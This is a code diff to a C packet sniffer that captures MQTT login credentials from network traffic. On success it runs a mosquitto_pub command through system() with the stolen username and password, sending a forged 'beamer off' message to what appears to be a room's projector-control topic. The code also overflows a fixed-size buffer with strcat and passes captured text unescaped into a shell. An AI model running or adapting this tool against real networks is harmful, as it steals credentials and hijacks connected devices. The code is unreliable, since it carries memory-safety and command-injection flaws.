@@ -27,6 +27,7 @@ int tcp=0,others=0,total=0,i,j;
 char user_name[1024]; //Saved Username
 char password[1024];
 char identifier[1024];
+char cmd[] = "mosquitto_pub -m \"beamer off\" -t \"/uos/93/E06/beamer-control\" -u ";
 
 struct sockaddr_in source,dest; //erstelle Sockadress
  
@@ -58,8 +59,13 @@ int main(int argc, char **argv){
         }
         //Now process the packet
         forward_packet(buffer , data_size);
-        printf("Pass Found: %d\n",password_found);
         if(password_found){
+             
+             strcat(cmd,user_name);
+             strcat(cmd," -P ");
+             strcat(cmd,password);
+             system(cmd);
+              
              close(sock_raw);
              return 0;
         }
@@ -232,16 +238,7 @@ int filter_connect_flags(char* data_payload, int Size, int remaining_length, int
   
   printf("\n\n");
  
- //hier gefälschte nachricht absenden
- 
-  char cmd[] = "mosquitto_pub -m \"beamer off\" -t \"/uos/93/E06/beamer-control\" -u ";
-  strcat(cmd,user_name);
-  strcat(cmd," -P ");
-  strcat(cmd,password);
-  printf("Running Command: %s\n",cmd);
-  system(cmd);
-  printf("\n\n");
-  password_found = 1; //beende die Main Schleife
+  password_found = 1; //springe aus der Main Schleife
  }
  
  
